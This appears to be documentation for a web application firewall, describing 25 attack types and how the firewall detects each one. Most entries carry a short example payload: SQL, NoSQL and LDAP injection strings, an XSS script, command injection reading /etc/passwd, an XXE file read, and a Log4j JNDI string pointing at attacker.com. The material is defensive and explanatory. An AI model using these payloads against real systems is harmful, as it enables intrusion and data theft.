# 🛡️ Attacks

The WAF is designed to protect web applications against a wide array of attack vectors. It utilizes a combination of pattern matching, anomaly scoring, and other security mechanisms to detect and prevent these attacks. Here's a comprehensive overview of the attack types that the WAF is configured to protect against:

1.  **SQL Injection (SQLi):**
    *   **Description:** SQL Injection is a code injection technique used to attack data-driven applications, allowing malicious actors to interfere with the queries that an application makes to its database. Attackers can execute malicious SQL statements that could bypass authentication, access or modify sensitive data, or even gain control of the database server.
    *   **WAF Protection:** The WAF uses regular expressions and pattern matching to detect common SQL injection keywords and syntax within request parameters, headers, and body. It can detect attempts to manipulate SQL queries using techniques like UNION injections, comment bypasses, and others.
    *   **Example Attack:** `user' OR '1'='1'; --`
2.  **Cross-Site Scripting (XSS):**
    *   **Description:** XSS attacks involve injecting malicious scripts (typically JavaScript) into web pages viewed by other users. These scripts can be used to steal session cookies, redirect users to malicious sites, or modify the content of a page in a way that tricks users.
    *   **WAF Protection:** The WAF scans for common XSS payloads within request headers, parameters, and the body, particularly within user-submitted content. It uses pattern matching to detect script tags, event handlers, and other potential XSS attack vectors. It can also detect XSS through encoded payloads.
    *   **Example Attack:** `<script>alert('XSS')</script>`
3.  **Path Traversal:**
    *   **Description:** Path traversal attacks exploit vulnerabilities that allow an attacker to access restricted files and directories on a web server by manipulating file paths in the request. This can lead to unauthorized access to configuration files, source code, or other sensitive information.
    *   **WAF Protection:** The WAF blocks requests containing path traversal sequences like `../` or `..\\`, which are commonly used to access files outside the web application's document root. It also scans for encoded path traversal sequences.
    *   **Example Attack:** `../../../../etc/passwd`
4.  **Remote Code Execution (RCE):**
    *   **Description:** RCE attacks enable malicious actors to execute arbitrary code on a server. This can result from vulnerabilities in application software, operating systems, or other components. Attackers can use RCE to gain full control of a server, install malware, or steal sensitive data.
    *   **WAF Protection:** The WAF detects and blocks known RCE patterns including command injection attempts, and exploits of known vulnerabilities, by looking at command injection keywords in various parts of the request (headers, query parameters, body).
    *   **Example Attack:** `$(whoami)` or `| cat /etc/passwd`
5.  **Log4j Exploits:**
    *  **Description:** The Log4j vulnerability (CVE-2021-44228) allows attackers to execute arbitrary code by injecting crafted input strings that are processed by the vulnerable Log4j library.
    *  **WAF Protection:** The WAF identifies and blocks common Log4j exploit patterns within the request body, query parameters, headers, and URI. The patterns look for specific strings that are used to exploit the vulnerability.
    *  **Example Attack:** `${jndi:ldap://attacker.com/evil}`
6.  **Protocol Attacks:**
    *   **Description:** These are attacks that target sensitive protocol or configuration files like `.htaccess`, `.git`, or other private resources that should not be accessed directly through the web.
    *   **WAF Protection:** The WAF blocks access to these files and directories by using a rule that looks for known file names and path patterns.
    *  **Example Attack:** `/.git/config` or `/web.config`
7.  **Scanner Detection:**
    *   **Description:** Vulnerability scanners are automated tools used to discover security issues in web applications. Malicious actors use these tools to probe systems for weaknesses and plan attacks.
    *   **WAF Protection:** The WAF identifies and blocks requests that are associated with known vulnerability scanners by looking for specific headers, user agent strings, and other characteristics.
8.  **Header & Cookie Injection:**
    *   **Description:** Attackers attempt to inject malicious content through HTTP headers or cookies to manipulate application behavior or exploit vulnerabilities. This can be used to launch various types of attacks, like XSS or session hijacking.
    *   **WAF Protection:** The WAF inspects both request and response headers and cookies for malicious patterns, blocking any requests that contain suspicious data in these areas.
    *   **Example Attack:** Setting a cookie with a malicious Javascript payload.
9.  **Insecure Deserialization:**
    *   **Description:** This attack occurs when an application deserializes data from an untrusted source, leading to arbitrary code execution if the data has been maliciously crafted.
    *   **WAF Protection:** The WAF detects requests with serialized data and blocks any known insecure deserialization payloads.
    *   **Example Attack:** Malicious serialized Java object.
10. **HTTP Request Smuggling:**
    *   **Description:** HTTP Request Smuggling involves crafting malicious HTTP requests that exploit discrepancies between how front-end proxies and back-end servers interpret requests. This can allow attackers to bypass security checks or access restricted resources.
    *   **WAF Protection:** The WAF can detect and block requests that contain suspicious header combinations that can be used for request smuggling attacks.
11. **HTTP Response Splitting:**
    *   **Description:** HTTP Response Splitting occurs when an attacker injects malicious data into the header of a response that causes the server to create additional HTTP responses, resulting in XSS or other attacks.
    *  **WAF Protection:** The WAF detects and blocks attempts to inject newline characters or other malicious content into HTTP response headers.
12. **Insecure Direct Object Reference (IDOR):**
    *   **Description:** IDOR vulnerabilities occur when an application exposes direct references to internal objects, allowing attackers to bypass authorization checks and access resources they should not have access to by using predictable identifiers.
    *   **WAF Protection:** The WAF detects attempts to access resources using sequential IDs or patterns associated with IDOR attacks. The WAF does not fully prevent these attacks as that would require knowing the valid identifiers, so it relies on generic patterns.
    *   **Example Attack:** Modifying a user ID in the URL to access another user's profile.
13. **Server-Side Request Forgery (SSRF):**
    *   **Description:** SSRF attacks enable a malicious actor to make requests from a server to internal resources, allowing them to bypass firewalls, access sensitive systems or data, and perform port scanning and information gathering.
    *   **WAF Protection:** The WAF blocks or flags requests that attempt to access internal resources or known sensitive ports by looking at the requested URL or domain.
    *  **Example Attack:** `http://localhost:8080/admin/users` or `http://127.0.0.1:3306`
14. **XML External Entity (XXE) Injection:**
    *   **Description:** XXE attacks occur when an attacker manipulates XML input to make an application access external resources. This can lead to information disclosure or denial-of-service attacks by reading local files or making connections to internal resources.
    *   **WAF Protection:** The WAF detects and blocks attempts to use external entities and other XML manipulation attempts.
    *  **Example Attack:** `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd" >]> `
15. **Server-Side Template Injection (SSTI):**
    *   **Description:** SSTI attacks exploit template engines by injecting malicious template code that can be executed on the server, resulting in RCE and other malicious behavior.
    *   **WAF Protection:** The WAF detects patterns related to SSTI attacks, by looking for common template engine syntax within the request body or query parameters.
     *   **Example Attack:** `{{7*7}}`
16. **Mass Assignment:**
    *   **Description:** Mass assignment vulnerabilities occur when an application automatically binds user input directly to object attributes without proper sanitization. Attackers can exploit this by injecting malicious input to modify fields they should not have access to.
    *   **WAF Protection:** The WAF can detect and block attempts to manipulate attributes that should not be modified by analyzing request bodies.
    *   **Example Attack:** Adding a `is_admin: true` field to an object to elevate user privileges.
17. **NoSQL Injection:**
    *   **Description:** NoSQL injection is similar to SQL injection but targets NoSQL databases. Attackers can inject malicious NoSQL queries to bypass authentication, access or modify data, or perform other unwanted actions.
    *   **WAF Protection:** The WAF detects common NoSQL injection patterns using regular expressions.
    *  **Example Attack:** `{$where: '1==1'}`
18.  **XPath Injection:**
    *   **Description:** XPath injection involves injecting malicious XPath queries to manipulate XML documents. Attackers can use this technique to access sensitive data within XML documents or perform unauthorized operations.
    *   **WAF Protection:** The WAF detects and blocks malicious XPath queries by looking for specific syntax patterns.
    *   **Example Attack:** `' or '1'='1'`
19. **LDAP Injection:**
    *  **Description:** LDAP injection is similar to SQL injection, but for LDAP queries, which can allow to bypass authentication or access information.
    *   **WAF Protection:** The WAF detects and blocks attempts to inject malicious content to manipulate LDAP queries.
     *   **Example Attack:** `(|(username=*)(password=*))`
20. **XML Injection:**
      *   **Description:** XML Injection attacks try to manipulate XML by injecting malicious content that can be used to cause a denial of service, bypass authentication or even execute code in the server.
      *    **WAF Protection:** The WAF has rules that detect different kinds of XML attacks including injection of malicious code.
21. **File Upload:**
    *   **Description:** This attack involves uploading malicious files to a web server that can be used to execute code or perform other malicious actions.
    *  **WAF Protection:** The WAF can detect and block attempts to upload files based on their extension, type or other characteristics.
22.  **JWT Attacks:**
    *   **Description:** Attacks that try to manipulate JSON Web Tokens (JWT) to bypass authentication or impersonate users by tampering with the header, payload, or signature.
    *   **WAF Protection:** The WAF detects JWT tampering by validating and analyzing JWT tokens present in requests and looking for common bypass attempts.
23.  **GraphQL Injection:**
    *   **Description:** GraphQL injection attacks exploit vulnerabilities in GraphQL APIs to execute unauthorized operations or retrieve sensitive data. Attackers can inject malicious queries, mutations, or fragments into GraphQL requests.
    *   **WAF Protection:** The WAF detects and blocks common patterns of GraphQL injection attempts.
24.  **Clickjacking:**
    *  **Description:** Clickjacking is an attack technique where malicious actors trick users into clicking on a hidden element that is placed over a legitimate webpage.
    *   **WAF Protection:** The WAF has rules that mitigate Clickjacking attempts by adding headers to prevent the protected page to be rendered inside a frame.
25. **Cross-Site Request Forgery (CSRF):**
    *   **Description:** CSRF attacks force logged-in users to perform unwanted actions on a web application. The attacker tricks the user's browser into making a request to the server while the user is authenticated, without them being aware of it.
    *   **WAF Protection:** The WAF has rules that protect against CSRF attacks by checking for a CSRF token and by adding headers to prevent such attacks from being performed, if implemented in the application.

By providing comprehensive protection against these common attack types, the WAF acts as a critical security layer for web applications. Regular updates of the WAF rules are essential to ensure continued protection against new and evolving threats. The protection mechanism is usually based on pattern matching, and you need to be aware that it will not always guarantee the full protection against all the variations of these types of attacks.
